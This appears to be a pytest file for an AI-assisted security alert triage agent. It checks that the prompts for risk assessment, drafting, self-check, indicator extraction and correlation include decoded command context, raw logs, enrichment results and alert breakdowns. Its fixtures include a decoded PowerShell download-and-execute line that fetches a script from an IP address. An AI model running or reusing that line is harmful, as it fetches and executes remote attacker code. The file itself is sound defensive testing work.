from datetime import datetime, timezone
from uuid import uuid4

from app.agent.prompts import (
    build_correlation_decision_prompt,
    build_draft_canonical_prompt,
    build_draft_experimental_prompt,
    build_extract_indicators_prompt,
    build_risk_assessment_prompt,
    build_self_check_prompt,
)
from app.agent.schemas import DraftReportCanonical, PatternType, RecommendedAction, SearchTemplate
from app.integration.models import SearchResult
from app.schemas import (
    AgentRef,
    Alert,
    CommandDecodeResult,
    Confidence,
    DecodedSegment,
    EnrichmentResult,
    EnrichmentVerdict,
    IndicatorType,
    RiskAssessment,
    Severity,
)


def _make_alert(**overrides):
    defaults = dict(
        alert_id=uuid4(),
        source_alert_id="1700000000.987654",
        source_system="wazuh",
        rule_id="92009",
        rule_description="Sysmon - process creation",
        rule_level=12,
        timestamp=datetime.now(timezone.utc),
        ingested_at=datetime.now(timezone.utc),
        agent=AgentRef(id="003", name="WIN-DESKTOP01", ip="172.20.10.5"),
        manager_name="wazuh-manager",
        location="EventChannel",
        full_log="",
        raw_json={"rule": {"id": "92009"}},
    )
    defaults.update(overrides)
    return Alert(**defaults)


_COMMAND_CONTEXT = CommandDecodeResult(
    command_line="powershell.exe -EncodedCommand SQBFAFgA...",
    parent_command_line="C:\\Windows\\explorer.exe",
    decoded_segments=[
        DecodedSegment(
            encoding="powershell_encoded",
            original="SQBFAFgA...",
            decoded="IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.1/a.ps1')",
        )
    ],
)


def test_risk_assessment_prompt_includes_command_context_when_present():
    prompt = build_risk_assessment_prompt(_make_alert(), PatternType.OTHER, 0, [], command_context=_COMMAND_CONTEXT)

    assert "powershell.exe -EncodedCommand" in prompt
    assert "185.220.101.1" in prompt


def test_risk_assessment_prompt_omits_command_context_when_absent():
    prompt = build_risk_assessment_prompt(_make_alert(), PatternType.OTHER, 0, [])

    assert "Command line:" not in prompt


def test_draft_canonical_prompt_includes_command_context():
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    prompt = build_draft_canonical_prompt(
        _make_alert(), PatternType.OTHER, 0, [], risk_assessment, command_context=_COMMAND_CONTEXT
    )

    assert "185.220.101.1" in prompt


def test_draft_experimental_prompt_includes_command_context():
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    prompt = build_draft_experimental_prompt(
        _make_alert(), PatternType.OTHER, 0, [], risk_assessment, command_context=_COMMAND_CONTEXT
    )

    assert "185.220.101.1" in prompt


def test_self_check_prompt_includes_command_context():
    draft = DraftReportCanonical(alert_summary="x", rationale="y", recommended_actions=[RecommendedAction.MONITOR_NO_ACTION])
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    prompt = build_self_check_prompt(
        draft, PatternType.OTHER, 0, [], risk_assessment, command_context=_COMMAND_CONTEXT
    )

    assert "185.220.101.1" in prompt


def test_extract_indicators_prompt_includes_extra_texts_when_present():
    prompt = build_extract_indicators_prompt(
        _make_alert(), extra_texts=["IEX (New-Object Net.WebClient).DownloadString('hxxp://185[.]220[.]101[.]1/a.ps1')"]
    )

    assert "185[.]220[.]101[.]1" in prompt


def test_extract_indicators_prompt_omits_extra_texts_when_absent():
    prompt = build_extract_indicators_prompt(_make_alert())

    assert "Additional decoded command-line text" not in prompt


def test_command_context_fields_are_truncated_in_prompt():
    long_command = "a" * 1000
    long_context = CommandDecodeResult(command_line=long_command, decoded_segments=[])

    prompt = build_risk_assessment_prompt(_make_alert(), PatternType.OTHER, 0, [], command_context=long_context)

    assert "a" * 501 not in prompt
    assert "...(truncated)" in prompt


def _enrichment(value="203.0.113.5", verdict=EnrichmentVerdict.MALICIOUS, score=91.0, provider_id="abuseipdb"):
    now = datetime.now(timezone.utc)
    return EnrichmentResult(
        indicator_type=IndicatorType.IP,
        indicator_value=value,
        provider_id=provider_id,
        queried_at=now,
        verdict=verdict,
        score=score,
        cache_expires_at=now,
    )


def test_correlation_prompt_includes_distinct_value_breakdown():
    # Five hits spread across five destination ports — the cardinality is what separates
    # this from five attempts against a single port, though total_count is 5 either way.
    correlated = [
        _make_alert(source_ip="203.0.113.5", destination_port=port) for port in (22, 80, 443, 3389, 8080)
    ]
    results = {SearchTemplate.SAME_SRC_IP_24H: SearchResult(alerts=correlated, total_count=5)}

    prompt = build_correlation_decision_prompt(_make_alert(source_ip="203.0.113.5"), results, 5, [])

    assert "destination ports: 5" in prompt
    assert "source ips: 1" in prompt


def test_correlation_prompt_omits_breakdown_when_no_alert_bodies_available():
    results = {SearchTemplate.SAME_RULE_ID_HOST: SearchResult(alerts=[], total_count=9)}

    prompt = build_correlation_decision_prompt(_make_alert(), results, 9, [])

    assert "9 matching alert(s)" in prompt
    assert "destination ports" not in prompt


def test_correlation_prompt_includes_enrichment_verdicts():
    prompt = build_correlation_decision_prompt(_make_alert(), {}, 0, [_enrichment()])

    assert "203.0.113.5" in prompt
    assert "malicious" in prompt
    assert "abuseipdb" in prompt


def test_correlation_prompt_reports_no_enrichment_explicitly():
    prompt = build_correlation_decision_prompt(_make_alert(), {}, 0, [])

    assert "Enrichment verdicts:" in prompt
    assert "none" in prompt


def test_correlation_prompt_omits_spread_guidance_when_no_breakdown_available():
    # Mail alerts carry none of the typed fields the breakdown is computed from, so the
    # guidance would otherwise explain distinct-value counts that are not in the prompt.
    results = {SearchTemplate.SAME_RULE_ID_HOST: SearchResult(alerts=[], total_count=9)}

    prompt = build_correlation_decision_prompt(_make_alert(), results, 9, [])

    assert "distinct-value counts describe" not in prompt


def test_correlation_prompt_includes_spread_guidance_when_breakdown_present():
    correlated = [_make_alert(source_ip="203.0.113.5", destination_port=p) for p in (22, 80, 443)]
    results = {SearchTemplate.SAME_SRC_IP_24H: SearchResult(alerts=correlated, total_count=3)}

    prompt = build_correlation_decision_prompt(_make_alert(source_ip="203.0.113.5"), results, 3, [])

    assert "distinct-value counts describe" in prompt


_RAW_LOG = "datetime=2026-07-30T09:15:07Z|Sender=cfo.support@evil.test|Subject=Urgent|ScanResultInfo=Malicious"


def test_risk_assessment_prompt_includes_raw_log_when_present():
    prompt = build_risk_assessment_prompt(_make_alert(), PatternType.OTHER, 0, [], raw_log=_RAW_LOG)

    assert "ScanResultInfo=Malicious" in prompt


def test_risk_assessment_prompt_omits_raw_log_block_when_absent():
    prompt = build_risk_assessment_prompt(_make_alert(), PatternType.OTHER, 0, [])

    assert "Raw log line" not in prompt


def test_draft_canonical_prompt_includes_raw_log():
    risk = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    prompt = build_draft_canonical_prompt(_make_alert(), PatternType.OTHER, 0, [], risk, raw_log=_RAW_LOG)

    assert "ScanResultInfo=Malicious" in prompt


def test_self_check_prompt_includes_raw_log():
    # Self-Check must see the same raw log Draft-A saw, or it flags well-grounded claims
    # as unsupported because the evidence behind them is invisible to it.
    draft = DraftReportCanonical(
        alert_summary="x", rationale="y", recommended_actions=[RecommendedAction.MONITOR_NO_ACTION]
    )
    risk = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    prompt = build_self_check_prompt(draft, PatternType.OTHER, 0, [], risk, raw_log=_RAW_LOG)

    assert "ScanResultInfo=Malicious" in prompt


def test_raw_log_is_truncated_in_prompt():
    prompt = build_risk_assessment_prompt(_make_alert(), PatternType.OTHER, 0, [], raw_log="b" * 1000)

    assert "b" * 501 not in prompt
    assert "...(truncated)" in prompt


def test_errored_enrichment_shows_the_failure_not_a_zero_score():
    # score 0 on a 0-100 malice scale reads as an affirmative all-clear; a rate-limited
    # lookup means "we could not find out", which is the opposite claim.
    now = datetime.now(timezone.utc)
    errored = EnrichmentResult(
        indicator_type=IndicatorType.IP, indicator_value="9.9.9.9", provider_id="abuseipdb",
        queried_at=now, verdict=EnrichmentVerdict.UNKNOWN, score=0.0, cache_expires_at=now,
        error="rate_limited",
    )

    prompt = build_correlation_decision_prompt(_make_alert(), {}, 0, [errored])

    assert "rate_limited" in prompt
    assert "score 0" not in prompt


def test_successful_enrichment_still_shows_its_score():
    prompt = build_correlation_decision_prompt(_make_alert(), {}, 0, [_enrichment()])

    assert "score 91" in prompt


def test_breakdown_marks_when_cardinality_covers_only_part_of_the_matches():
    # alerts[] is capped at the connector's page size while total_count is unbounded, so
    # the two numbers must not look like they describe the same set.
    correlated = [_make_alert(destination_port=p) for p in range(1, 4)]
    results = {SearchTemplate.SAME_RULE_ID_HOST: SearchResult(alerts=correlated, total_count=900)}

    prompt = build_correlation_decision_prompt(_make_alert(), results, 900, [])

    assert "over first 3 of 900" in prompt
